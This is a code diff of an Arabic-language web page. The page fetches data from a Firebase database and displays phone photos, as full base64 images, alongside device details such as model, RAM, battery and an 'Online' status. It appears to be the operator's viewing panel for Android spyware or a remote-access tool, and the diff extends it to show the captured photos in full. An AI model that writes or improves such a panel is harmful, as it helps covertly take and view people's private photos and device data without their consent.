@@ -7,22 +7,22 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:15px}
-        h1{color:#25D366;text-align:center;margin:20px 0;font-size:24px}
+        h1{color:#25D366;text-align:center;margin:20px 0}
         .tabs{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:15px 0}
-        .tab{padding:12px 18px;background:#1a1a1a;border:2px solid #333;border-radius:10px;cursor:pointer;font-size:14px;font-weight:bold;transition:0.2s;color:#fff}
-        .tab:hover{background:#222}.tab.active{background:#25D366;color:#000;border-color:#25D366}
+        .tab{padding:12px 18px;background:#1a1a1a;border:2px solid #333;border-radius:10px;cursor:pointer;font-size:14px;font-weight:bold;color:#fff}
+        .tab.active{background:#25D366;color:#000}
         .content{max-width:800px;margin:0 auto}
-        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px}
-        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;transition:0.2s}
+        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
+        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;cursor:pointer}
         .item:hover{border-color:#25D366}
-        .item .icon{font-size:45px;margin:10px 0}
-        .item .name{font-size:11px;word-break:break-all;color:#ccc}
-        .item .size{font-size:10px;color:#25D366}
-        .info-box{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px;text-align:center}
-        .info-box p{margin:10px 0;font-size:16px}
+        .item img{width:100%;height:150px;object-fit:cover;border-radius:8px}
+        .item .name{font-size:10px;color:#ccc;margin-top:5px;word-break:break-all}
+        .info-box{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px}
+        .info-box p{margin:10px 0}
         .info-box b{color:#25D366}
-        .loading{text-align:center;color:#888;padding:40px}
-        .empty{text-align:center;color:#888;padding:30px}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:100;justify-content:center;align-items:center}
+        .modal img{max-width:90%;max-height:90%;border-radius:10px}
+        .modal .close{position:absolute;top:20px;right:20px;font-size:30px;color:#fff;cursor:pointer}
     </style>
 </head>
 <body>
@@ -30,29 +30,27 @@
     
     <div class="tabs">
         <div class="tab active" onclick="showTab('photos',this)">📸 الصور</div>
-        <div class="tab" onclick="showTab('videos',this)">🎥 الفيديوهات</div>
-        <div class="tab" onclick="showTab('files',this)">📁 الملفات</div>
         <div class="tab" onclick="showTab('info',this)">📊 الجهاز</div>
     </div>
     
-    <div class="content" id="content"><div class="loading">⏳ جاري التحميل...</div></div>
+    <div class="content" id="content"></div>
+    
+    <div class="modal" id="modal" onclick="this.style.display='none'">
+        <span class="close">×</span>
+        <img id="modalImg" src="">
+    </div>
 
     <script>
-        let allData = {photos: [], videos: [], files: [], device: null};
+        let allData = {photos: [], device: null};
         
-        // تحميل من Firebase
         fetch('https://otp-5acda-default-rtdb.firebaseio.com/panel.json')
             .then(r => r.json())
             .then(data => {
-                if (!data) return document.getElementById('content').innerHTML = '<div class="empty">لا توجد بيانات</div>';
-                
-                Object.values(data).forEach(entry => {
-                    if (entry.type === 'photos') allData.photos = entry.data;
-                    if (entry.type === 'videos') allData.videos = entry.data;
-                    if (entry.type === 'files') allData.files = entry.data;
-                    if (entry.type === 'device') allData.device = entry.data;
+                if (!data) return;
+                Object.values(data).forEach(e => {
+                    if (e.type === 'photos') allData.photos = e.data;
+                    if (e.type === 'device') allData.device = e.data;
                 });
-                
                 showTab('photos', document.querySelector('.tab'));
             });
         
@@ -64,28 +62,28 @@
             if (tab === 'photos') {
                 c.innerHTML = allData.photos.length ? 
                     '<div class="grid">' + allData.photos.map(p => `
-                        <div class="item"><div class="icon">📸</div><div class="name">${p.name}</div><div class="size">${p.size}</div></div>
-                    `).join('') + '</div>' : '<div class="empty">لا توجد صور</div>';
-            }
-            else if (tab === 'videos') {
-                c.innerHTML = allData.videos.length ? 
-                    '<div class="grid">' + allData.videos.map(v => `
-                        <div class="item"><div class="icon">🎥</div><div class="name">${v.name}</div><div class="size">${v.size}</div></div>
-                    `).join('') + '</div>' : '<div class="empty">لا توجد فيديوهات</div>';
-            }
-            else if (tab === 'files') {
-                c.innerHTML = allData.files.length ? 
-                    '<ul style="list-style:none">' + allData.files.map(f => `<li style="padding:10px;background:#111;margin:5px 0;border-radius:8px">📄 ${f.name}</li>`).join('') + '</ul>' : '<div class="empty">لا توجد ملفات</div>';
+                        <div class="item" onclick="openImage('${p.base64}')">
+                            <img src="${p.base64}">
+                            <div class="name">${p.name}</div>
+                        </div>
+                    `).join('') + '</div>' : '<p style="color:#888;text-align:center">لا توجد صور</p>';
             }
             else if (tab === 'info') {
                 c.innerHTML = allData.device ? 
                     '<div class="info-box">' +
                     '<p>📱 <b>' + allData.device.device + '</b></p>' +
+                    '<p>🏷️ ' + allData.device.brand + '</p>' +
                     '<p>🤖 Android ' + allData.device.android + '</p>' +
+                    '<p>💾 RAM: ' + allData.device.ram + '</p>' +
                     '<p>🔋 ' + allData.device.battery + '</p>' +
                     '<p>🟢 Online</p>' +
-                    '</div>' : '<div class="empty">لا توجد معلومات</div>';
+                    '</div>' : '<p style="color:#888;text-align:center">لا توجد معلومات</p>';
             }
+        }
+        
+        function openImage(src) {
+            document.getElementById('modalImg').src = src;
+            document.getElementById('modal').style.display = 'flex';
         }
     </script>
 </body>
